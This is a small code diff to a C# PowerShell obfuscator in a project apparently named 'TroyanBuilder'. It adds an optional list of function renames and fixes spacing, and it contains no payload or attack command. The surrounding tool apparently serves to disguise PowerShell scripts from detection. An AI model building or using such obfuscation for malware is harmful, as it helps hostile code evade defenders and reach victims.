@@ -6,7 +6,7 @@ namespace TroyanBuilder
 {
     public partial class PowerShellObfuscator
     {
-        private  readonly Dictionary<string,Dictionary<string, string>> RenamedVar = new();
+        private readonly Dictionary<string,Dictionary<string, string>> RenamedVar = new();
 
         public void ObfuscateFile(string psScriptFile)
         {
@@ -16,10 +16,17 @@ namespace TroyanBuilder
             File.WriteAllText(psScriptFile, data);
         }
 
-        public string Obfuscate(string psScript)
+        public string Obfuscate(string psScript, Dictionary<string,string>? renamedFuncs = null)
         {
             try
             {
+                if (renamedFuncs != null)
+                {
+                    foreach (var renamedVar in renamedFuncs)
+                    {
+                        AddRenamedFunction( renamedVar.Key, renamedVar.Value);
+                    }
+                }
                 var parsed = Parse(psScript);
             
                 FindAndRenameFunctions(parsed, "general");
